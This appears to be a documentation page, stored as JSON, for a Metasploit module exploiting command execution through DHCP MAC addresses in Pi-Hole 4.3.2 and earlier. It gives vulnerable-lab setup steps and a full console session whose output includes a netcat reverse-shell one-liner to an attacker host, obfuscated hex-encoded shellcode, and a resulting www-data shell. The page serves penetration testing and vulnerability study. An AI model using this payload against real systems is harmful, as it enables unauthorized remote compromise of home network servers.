{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/http/pihole_dhcp_mac_exec","result":{"data":{"moduleMetadataJson":{"id":"c3499eb8-0f2a-52ac-98f6-0e6aeaa3a3a6","name":"Pi-Hole DHCP MAC OS Command Execution","fullname":"exploit/unix/http/pihole_dhcp_mac_exec","description":"This exploits a command execution in Pi-Hole <= 4.3.2.  A new DHCP static lease is added\n          with a MAC address which includes an RCE.  Exploitation requires /opt/pihole to be first\n          in the $PATH due to exploitation constraints.  DHCP server is not required to be running.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/unix/http/pihole_dhcp_mac_exec","documentationSlug":"/modules/documentation/exploit/unix/http/pihole_dhcp_mac_exec","referencesSlug":"/modules/references/exploit/unix/http/pihole_dhcp_mac_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This exploits a command execution in Pi-Hole &#x3C;= 4.3.2. A new DHCP\nstatic lease is added with a MAC address which includes an RCE.\nDHCP server is not required to be running.</p>\n<p>Exploitation has many constraints, outlined in the original\n<a href=\"https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">technical writeup</a>.</p>\n<ol>\n<li>Exploitation requires <code class=\"language-text\">/opt/pihole</code> to be first in the <code class=\"language-text\">$PATH</code> due to\nexploitation constraints.</li>\n<li>Payload must not contain <code class=\"language-text\">%00</code></li>\n<li>Payload must be all capital letters</li>\n</ol>\n<h3 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h3>\n<p>Install Pi-Hole <a href=\"https://github.com/pi-hole/pi-hole/releases/tag/v4.3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Pi-Hole 4.3</a>\nwith the following commands:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo git clone --depth=1 -b v4.3 https://github.com/pi-hole/pi-hole.git /etc/.pihole\n# replace &#39;git clone&#39; with &#39;git clone -b v4.3&#39;\nsudo nano /etc/.pihole/automated\\ install/basic-install.sh\nsudo ./basic-install.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Pi-Hole attempts to install the latest versions of the software.  Modifying the git clone\ncommand will force it to install the old AdminLTE and Pi-Hole versions.  However this\nwill make FTL fail to install.</p>\n<p>Answer everything with the default.</p>\n<p>Lastly, we need to create one file which wasn't made.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo touch /etc/pihole/GitHubVersions</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>If <code class=\"language-text\">/opt/pihole</code> isn't in the path (for php/lighttp) because the install process wasn't 100% due\nto the forcing of version 4.3, edit <code class=\"language-text\">/etc/lighttpd/conf-available/15-fastcgi-php.conf</code> and\nadd a new item to bin-environment.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&quot;PATH&quot; =&gt; &quot;opt/pihole:&quot; + env.PATH</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>This will be enough to make it exploitable, however the dashboard won't fully work since some\nother components were installed which are too new for it to work with.</p>\n<p>If you wish to install FTL, follow the <a href=\"https://docs.pi-hole.net/ftldns/compile/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">directions</a>.</p>\n<h3 id=\"setup-docker\" style=\"position:relative;\"><a href=\"#setup-docker\" aria-label=\"setup docker permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup (docker)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ cat docker-compose.yml\nversion: &quot;3&quot;\n\n# More info at https://github.com/pi-hole/docker-pi-hole/ and https://docs.pi-hole.net/\nservices:\n  pihole:\n    container_name: pihole\n    image: pihole/pihole:4.3\n    ports:\n#      - &quot;53:53/tcp&quot;\n#      - &quot;53:53/udp&quot;\n#      - &quot;67:67/udp&quot;\n      - &quot;80:80/tcp&quot;\n#      - &quot;443:443/tcp&quot;\n    environment:\n      TZ: &#39;America/Chicago&#39;\n      WEBPASSWORD: &#39;password123&#39;\n    # Volumes store your data between container upgrades\n    #volumes:\n    #   - &#39;./etc-pihole/:/etc/pihole/&#39;\n    #   - &#39;./etc-dnsmasq.d/:/etc/dnsmasq.d/&#39;\n    dns:\n      - 127.0.0.1\n      - 1.1.1.1\n    # Recommended but not required (DHCP needs NET_ADMIN)\n    #   https://github.com/pi-hole/docker-pi-hole#note-on-capabilities\n    cap_add:\n      - NET_ADMIN\n    restart: unless-stopped</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"cleanup\" style=\"position:relative;\"><a href=\"#cleanup\" aria-label=\"cleanup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cleanup</h3>\n<p>This will attempt to clean entries in <code class=\"language-text\">/etc/dnsmasq.d/04-pihole-static-dhcp.conf</code>.\nHowever, on failure, <code class=\"language-text\">sudo pihole -a removestaticdhcp &lt;MAC&gt;</code> can be used to remove them.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/unix/http/pihole_dhcp_mac_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhosts</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"password\" style=\"position:relative;\"><a href=\"#password\" aria-label=\"password permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Password</h3>\n<p>Password for the web interface.  Randomly set on install.  Use <code class=\"language-text\">pihole -a -p</code> to change/remove it.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"pi-hole-43-with-adminlte-43-on-ubuntu-1804\" style=\"position:relative;\"><a href=\"#pi-hole-43-with-adminlte-43-on-ubuntu-1804\" aria-label=\"pi hole 43 with adminlte 43 on ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Pi-Hole 4.3 with AdminLTE 4.3 on Ubuntu 18.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/unix/http/pihole_dhcp_mac_exec\n[*] Using exploit/unix/http/pihole_dhcp_mac_exec\nmsf5 exploit(unix/http/pihole_dhcp_mac_exec) &gt; set rhosts 2.2.2.2\nrhosts =&gt; 2.2.2.2\nmsf5 exploit(unix/http/pihole_dhcp_mac_exec) &gt; set lhost 1.1.1.1\nlhost =&gt; 1.1.1.1\nmsf5 exploit(unix/http/pihole_dhcp_mac_exec) &gt; set lport 8888\nlport =&gt; 8888\nmsf5 exploit(unix/http/pihole_dhcp_mac_exec) &gt; set password password123\npassword =&gt; password123\nmsf5 exploit(unix/http/pihole_dhcp_mac_exec) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(unix/http/pihole_dhcp_mac_exec) &gt; run\n\n[+] mkfifo /tmp/wvfacoc; nc 1.1.1.1 8888 0&lt;/tmp/wvfacoc | /bin/sh &gt;/tmp/wvfacoc 2&gt;&amp;1; rm /tmp/wvfacoc\n[*] Started reverse TCP handler on 1.1.1.1:8888 \n[+] Version Detected: 4.3\n[*] Using cookie: PHPSESSID=4ce3tjd269lcut95orff4a45l8;\n[*] Login required, attempting login.\n[*] Using token: czTyD7HbrcwZfTS7gJg4xgxSkB/CjGNlJPTUueA0ACk=\n[*] Validating path with MAC: 8D540FBF0F5F\n[+] System env path exploitable: /opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n[*] Payload MAC will be: 818CC59E2B82\n[*] Shellcode: 818CC59E2B82&amp;&amp;W=${PATH#/???/}&amp;&amp;P=${W%%?????:*}&amp;&amp;X=${PATH#/???/??}&amp;&amp;H=${X%%???:*}&amp;&amp;Z=${PATH#*:/??}&amp;&amp;R=${Z%%/*}&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;2f62696e2f6563686f202d6e6520275c7836645c7836625c7836365c7836395c7836365c7836665c7832305c7832665c7837345c7836645c7837305c7832665c7837335c7837365c7836635c7836615c7836325c7833625c7832305c7836655c7836335c7832305c7833315c7833395c7833325c7832655c7833315c7833365c7833385c7832655c7833325c7832655c7833315c7833395c7833395c7832305c7833385c7833385c7833385c7833385c7832305c7833305c7833635c7832665c7837345c7836645c7837305c7832665c7837335c7837365c7836635c7836615c7836325c7832305c7837635c7832305c7832665c7836325c7836395c7836655c7832665c7837335c7836385c7832305c7833655c7832665c7837345c7836645c7837305c7832665c7837335c7837365c7836635c7836615c7836325c7832305c7833325c7833655c7832365c7833315c7833625c7832305c7837325c7836645c7832305c7832665c7837345c7836645c7837305c7832665c7837335c7837365c7836635c7836615c783632277c7368&quot;));&#39;&amp;&amp;\n[*] Sending Exploit\n[*] Command shell session 1 opened (1.1.1.1:8888 -&gt; 2.2.2.2:40226) at 2020-05-28 09:50:18 -0400\n[*] Attempting to clean 8D540FBF0F5F from config\n[*] Attempting to clean 818CC59E2B82 from config\n\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nuname -a\nLinux ubuntu1804 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\ncat /etc/os-release\nNAME=&quot;Ubuntu&quot;\nVERSION=&quot;18.04 LTS (Bionic Beaver)&quot;\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=&quot;Ubuntu 18.04 LTS&quot;\nVERSION_ID=&quot;18.04&quot;\nHOME_URL=&quot;https://www.ubuntu.com/&quot;\nSUPPORT_URL=&quot;https://help.ubuntu.com/&quot;\nBUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;\nPRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;\nVERSION_CODENAME=bionic\nUBUNTU_CODENAME=bionic</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c3499eb8-0f2a-52ac-98f6-0e6aeaa3a3a6"}}}